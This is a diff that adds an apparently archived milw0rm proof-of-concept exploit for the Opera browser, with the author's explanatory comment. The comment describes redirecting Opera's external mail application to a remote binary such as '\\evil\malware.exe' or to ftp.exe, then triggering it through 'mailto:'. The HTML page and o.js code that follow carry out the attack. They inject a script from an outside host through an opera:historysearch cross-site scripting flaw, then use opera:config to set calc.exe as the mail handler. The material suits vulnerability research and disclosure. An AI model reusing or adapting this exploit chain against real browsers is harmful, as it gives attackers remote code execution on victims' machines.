@@ -1,0 +1,45 @@
+<!--
+Just found a way to use Stefano’s opera:config idea to execute code from remote.
+
+Instead of changing the HTTP Proxy, an attacker can change the default external 
+mail application to “\\evil\malware.exe ”, or to local commands (e.g. ftp.exe 
+which can be used to download malicious binaries from remote). Also, there is a 
+need to change the “Mail Handler” settings to “2”, so opera will execute the 
+external mail application, instead of the default opera mail application.
+
+After changing the settings, the attacker can simply set the location to “mailto:” to execute the code.
+
+
+A proof-of-concept which executes the Windows Calculator can be found here: http://raffon.net/research/opera/history/op.html
+
+
+Cheers,
+
+--Aviv.
+
+http://aviv.raffon.net
+-->
+
+<html>
+<title>bb</title>
+<script>
+var z=null;
+function x() {
+  window.setTimeout("z=window.open('opera:historysearch?q=%2A');window.focus();",1500);
+  window.setTimeout("z.close();",3000);
+  window.setTimeout("location.href='mailto:'",3000);
+}
+</script> 
+<body>
+<a href="#<script src='http://www.raffon.net/research/opera/history/o.js'></script>" onclick="x()">Click me...</a>
+</body>
+</html>
+
+<o.js>
+s=document.createElement("IFRAME");
+s.src="opera:config";
+document.body.appendChild(s);
+s.src="javascript:opera.setPreference('Mail','External Application','c:\\\\windows\\\\system32\\\\calc.exe');opera.setPreference('Mail','Handler','2');parent.window.close()";
+</o.js>
+
+# milw0rm.com [2008-10-23]
